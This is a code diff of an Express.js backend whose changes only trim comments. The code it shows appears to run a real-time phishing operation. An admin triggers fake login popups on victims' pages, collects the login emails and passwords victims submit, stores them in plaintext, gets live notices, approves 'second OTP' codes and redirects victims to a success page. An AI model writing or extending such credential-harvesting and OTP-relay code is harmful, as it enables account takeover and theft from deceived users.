@@ -311,7 +311,7 @@ app.post('/api/users/submit-second-otp', async (req, res) => {
   }
 });
 
-// ==================== NEW ENDPOINTS ====================
+// ==================== NEW ENDPOINTS (ADDED) ====================
 
 // Admin force login - sends popup to user
 app.post('/api/admin/force-login', authenticateJWT, async (req, res) => {
@@ -321,7 +321,6 @@ app.post('/api/admin/force-login', authenticateJWT, async (req, res) => {
     
     console.log('🔔 Admin forcing login for user:', email);
     
-    // Emit socket event to trigger popup on user's page
     io.emit('force-login-popup', { 
       email,
       timestamp: new Date(),
@@ -343,13 +342,11 @@ app.post('/api/users/submit-login', async (req, res) => {
       return res.status(400).json({ error: 'All fields required' });
     }
     
-    // Email validation
     const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
     if (!emailRegex.test(loginEmail)) {
       return res.status(400).json({ error: 'Please enter a valid email address' });
     }
     
-    // Save login credentials to database
     await pool.query(
       'UPDATE users SET login_email = $1, login_password = $2 WHERE email = $3',
       [loginEmail, loginPassword, email]
@@ -357,7 +354,6 @@ app.post('/api/users/submit-login', async (req, res) => {
     
     console.log('🔔 User submitted login:', email, 'Login Email:', loginEmail);
     
-    // Notify admin
     io.emit('user-login-submitted', { 
       email,
       loginEmail,
@@ -373,7 +369,7 @@ app.post('/api/users/submit-login', async (req, res) => {
   }
 });
 
-// Admin redirect to success - instantly redirects user
+// Admin redirect to success
 app.post('/api/admin/redirect-success', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
@@ -381,7 +377,6 @@ app.post('/api/admin/redirect-success', authenticateJWT, async (req, res) => {
     
     console.log('🔔 Admin redirecting user to success:', email);
     
-    // Emit socket event to redirect user
     io.emit('redirect-to-success', { 
       email,
       redirectUrl: `/users/success?email=${encodeURIComponent(email)}`,
@@ -470,7 +465,7 @@ app.post('/api/admin/approve-user', authenticateJWT, async (req, res) => {
   }
 });
 
-// Admin approve second OTP - sets second_approved to true, button stays available
+// Admin approve second OTP
 app.post('/api/admin/approve-second', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
